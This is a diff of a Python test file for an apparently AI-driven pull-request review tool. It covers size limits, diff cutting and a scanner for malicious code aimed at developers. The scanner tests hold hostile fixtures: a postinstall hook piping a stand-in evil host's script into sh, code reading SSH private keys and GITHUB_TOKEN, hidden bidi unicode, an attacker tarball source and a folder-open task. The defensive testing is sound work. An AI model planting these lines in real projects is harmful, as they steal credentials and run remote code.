@@ -12,6 +12,7 @@ import sys
 import types
 import unittest
 from pathlib import Path
+from unittest import mock
 
 sys.dont_write_bytecode = True
 sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
@@ -39,7 +40,7 @@ class RepoCase(unittest.TestCase):
         return mb, self.repo.commit(head, parent=mb)
 
     def plan(self, mb: str, head: str, cfg: dict | None = None) -> dict:
-        args = types.SimpleNamespace(paths=None, no_split=False, lane_list=["claude", "gpt"], mode_list=["agentic"])
+        args = types.SimpleNamespace(paths=None, lane_list=["claude", "gpt"], mode_list=["agentic"])
         return rp.build_plan(args, {"title": "t", "body": ""}, self.repo.path, mb, head, cfg or {},
                              self.repo.dir / "scratch", self.repo.dir / "run")
 
@@ -97,7 +98,7 @@ class Coverage(RepoCase):
                 "d.sh": "rm -rf $P /build\n", "Makefile": "all:\n        echo\n"}
         mb, h = self.pr(files, head)
         recs = {r.path: r for r in seed.classify_files(self.repo.path, mb, h, {}, None)}
-        seed.plan_units(self.repo.path, h, list(recs.values()), {})
+        seed.plan_units(list(recs.values()), {})
         self.assertEqual((recs["a.rs"].kind, recs["a.rs"].reason), ("filtered", "whitespace-only change"))
         self.assertEqual(seed.not_reviewed(list(recs.values()))["files"],
                          [{"file": "a.rs", "why": "whitespace-only change"}])
@@ -143,7 +144,7 @@ class ConfigRules(RepoCase):
         self.assertEqual(got["q/a.md"][0], "docs")
         self.assertEqual(got["q/ign.rs"], ("filtered", "repo ignore glob `q/ign.rs`"))
 
-    def test_low_risk_parts_get_the_low_risk_lanes_split_or_not(self):
+    def test_a_low_risk_pr_gets_the_low_risk_lanes(self):
         mb, h = self.pr({"examples/demo.rs": "fn a() {}\n", "src/lib.rs": "fn a() {}\n"},
                         {"examples/demo.rs": "fn b() {}\n", "src/lib.rs": "fn a() {}\n"})
         plan = self.plan(mb, h, {"low_risk": ["examples/**"]})   # lane_list claude, gpt
@@ -151,7 +152,6 @@ class ConfigRules(RepoCase):
         self.assertTrue(u.low_risk)
         self.assertEqual(u.lanes, ["gpt"])   # the default low_risk_lanes that were requested
         self.assertIn("examples/demo.rs", plan["triage_input"])
-        self.assertEqual(plan["pr_map_input"], "")   # one part: no PR map
         plan = self.plan(mb, h, {"low_risk": ["examples/**"], "low_risk_lanes": ["fable"]})
         self.assertEqual(plan["units"][0].lanes, ["claude", "gpt"])   # none of them requested: every lane
         mb, h = self.pr({"examples/demo.rs": "fn a() {}\n", "src/lib.rs": "fn a() {}\n"},
@@ -168,9 +168,9 @@ class RepoConfig(unittest.TestCase):
         return rp.load_repo_config("o", "r", str(d / "config.toml"))
 
     def test_removed_keys_are_refused_with_their_replacement(self):
-        for key, value, says in (("sensitive", '["a/**"]', "always_review"), ("priority", '["a/**"]', "continue"),
+        for key, value, says in (("sensitive", '["a/**"]', "always_review"), ("priority", '["a/**"]', "one part"),
                                  ("nonsensitive_lanes", '["gpt"]', "low_risk_lanes"),
-                                 ("default_sensitive", "true", "low_risk"), ("unit_depth", "2", "path components")):
+                                 ("default_sensitive", "true", "low_risk"), ("unit_depth", "2", "one part")):
             with self.subTest(key=key), self.assertRaises(SystemExit) as e:
                 self.load(f"{key} = {value}\n")
             self.assertIn(f"`{key}` is no longer supported", str(e.exception))
@@ -182,11 +182,98 @@ class RepoConfig(unittest.TestCase):
                          (["x/**"], [], [], ["gpt", "kimi", "glm"]))
 
 
-class RunOrder(unittest.TestCase):
-    def test_path_order_with_low_risk_parts_last(self):
-        us = [seed.Unit(uid=f"u0{i}", name=n, files=[], effective=1.0, low_risk=lr)
-              for i, (n, lr) in enumerate([("a", False), ("b", True), ("c", False)], 1)]
-        self.assertEqual([u.uid for u in sorted(us, key=rp.unit_order)], ["u01", "u03", "u02"])
+class Size(RepoCase):
+    def test_a_pr_over_the_limit_is_not_reviewed_and_the_comment_asks_to_split_it(self):
+        mb, h = self.pr({"src/a.rs": "fn a() {}\n"}, {"src/a.rs": "".join(f"fn f{i}() {{}}\n" for i in range(40)),
+                                                     "tests/t.rs": "fn t() {}\n" * 10})
+        with mock.patch.object(seed, "MAX_EFFECTIVE", 30):
+            plan = self.plan(mb, h)
+            self.assertTrue(plan["too_big"])
+            out = Path(self.repo.dir / "reports")
+            args = types.SimpleNamespace(reports_dir=str(out), repo="o/r", pr=7)
+            rp.write_too_big(args, plan, "")
+            text = (out / "r-7.comment.md").read_text()
+        self.assertIn(f"{plan['sizes']['effective']:,.0f} effective changed lines", text)
+        self.assertIn("over the limit of 30", text)
+        self.assertIn("Split it into smaller PRs", text)
+        self.assertFalse(self.plan(mb, h)["too_big"])
+
+    def test_a_file_bigger_than_the_diff_limit_is_cut_not_dropped(self):
+        big = "".join(f"pub fn f{i}(x: u64) -> u64 {{ x + {i} }}\n" for i in range(900))
+        mb, h = self.pr({"src/small.rs": "fn s() {}\n"}, {"src/small.rs": "fn s() { 1 }\n", "src/big.rs": big})
+        recs = seed.classify_files(self.repo.path, mb, h, {}, None)
+        omitted: list[str] = []
+        diff, note, _ = seed.seed_diff(self.repo.path, mb, h, recs, self.attrs, cap=20_000, omitted_out=omitted)
+        self.assertLessEqual(len(diff), 20_000)
+        self.assertIn("the diff of src/big.rs is cut here", diff)
+        self.assertIn("+pub fn f0(x: u64)", diff)
+        self.assertIn("fn s() { 1 }", diff)
+        self.assertEqual(omitted, [])
+
+
+class MaliciousScan(RepoCase):
+    def test_scan_flags_what_runs_on_developer_machines(self):
+        base = {"package.json": '{"name": "x", "scripts": {"test": "vitest"}}\n', "src/lib.ts": "export const a = 1\n",
+                "tests/a.test.ts": "it('a', () => {})\n", "pnpm-lock.yaml": "lockfileVersion: 9\n"}
+        head = dict(base) | {
+            "package.json": '{"name": "x", "scripts": {"test": "vitest", "postinstall": "curl -s https://x.evil.example/i.sh | sh"}}\n',
+            "tests/a.test.ts": "import { readFileSync } from 'fs'\nconst k = readFileSync(`${home}/.ssh/id_ed25519`)\n"
+                               "const ok = true // \u202e } \u2066 if (admin) {\n",
+            "pnpm-lock.yaml": "lockfileVersion: 9\n  resolution: {tarball: https://pkgs.attacker.invalid/x.tgz}\n",
+            "src/lib.ts": "export const a = process.env.GITHUB_TOKEN\n",
+            ".vscode/tasks.json": '{"tasks": [{"runOptions": {"runOn": "folderOpen"}}]}\n',
+            "docs/x.md": "curl https://x.evil.example | sh\n"}
+        mb, h = self.pr(base, head)
+        recs = seed.classify_files(self.repo.path, mb, h, {}, None)
+        diff, hits = seed.malicious_input(self.repo.path, mb, h, recs, self.attrs)
+        got = {(x["file"], x["kind"]) for x in hits}
+        for want in [("package.json", "install script"), ("package.json", "download and run"),
+                     ("tests/a.test.ts", "credential files"), ("tests/a.test.ts", "hidden unicode"),
+                     ("pnpm-lock.yaml", "dependency source"), ("src/lib.ts", "secret env vars"),
+                     (".vscode/tasks.json", "runs by itself")]:
+            self.assertIn(want, got)
+        self.assertFalse([x for x in hits if x["file"] == "docs/x.md"])   # docs do not run
+        self.assertIn("tests/a.test.ts", diff)
+        self.assertIn("src/lib.ts", diff)               # a product file with a hit is shown too
+        self.assertNotIn("lockfileVersion", diff)        # lockfiles only through their hits
+        line = next(x for x in hits if x["kind"] == "credential files")
+        self.assertEqual(line["line"], 2)
+
+    def test_nothing_to_check_when_only_product_code_changed(self):
+        mb, h = self.pr({"src/a.rs": "fn a() {}\n"}, {"src/a.rs": "fn a() { 1 }\n"})
+        recs = seed.classify_files(self.repo.path, mb, h, {}, None)
+        self.assertEqual(seed.malicious_input(self.repo.path, mb, h, recs, self.attrs), ("", []))
+
+
+class MaliciousComment(unittest.TestCase):
+    def ctx(self, row):
+        return {"aux_rows": [row] if row else [], "malicious_hits": [
+            {"file": "tests/a.ts", "line": 3, "kind": "credential files", "text": "x"},
+            {"file": "src/b.ts", "line": 9, "kind": "runs commands", "text": "y"}]}
+
+    def test_found_nothing_found_and_failed(self):
+        item = {"file": "tests/a.ts", "line": 3, "technique": "t", "what": "reads ~/.ssh and posts <it>",
+                "evidence": "readFileSync(`~/.ssh`)", "confidence": "high"}
+        out = "\n".join(rp.malicious_lines(self.ctx({"lane": "malicious", "status": "ok", "malicious": [item]})))
+        self.assertIn("Possible malicious code aimed at developers or CI: 1", out)
+        self.assertIn("`tests/a.ts:3`", out)
+        self.assertIn("&lt;it&gt;", out)   # model text is escaped
+        out = rp.malicious_lines(self.ctx({"lane": "malicious", "status": "ok", "malicious": []}))
+        self.assertEqual(len(out), 1)
+        self.assertIn("nothing found", out[0])
+        out = rp.malicious_lines(self.ctx({"lane": "malicious", "status": "failed", "error": "down"}))
+        self.assertIn("Malicious-code check failed", out[0])
+        self.assertIn("`tests/a.ts:3` (credential files)", out[0])
+        self.assertNotIn("src/b.ts", out[0])   # weak pattern kinds are not listed
+        self.assertEqual(rp.malicious_lines(self.ctx(None)), [])
+
+    def test_answer_parsing(self):
+        items = rp.parse_malicious('{"items": [{"file": "a", "line": "7", "confidence": "HIGH"}, {"x": 1}, '
+                                   '{"file": "b", "line": null, "confidence": "maybe"}]}')
+        self.assertEqual([(i["file"], i["line"], i["confidence"]) for i in items],
+                         [("a", 7, "high"), ("b", 0, "medium")])
+        with self.assertRaises(Exception):
+            rp.parse_malicious("not json")
 
 
 class RustTestRanges(unittest.TestCase):
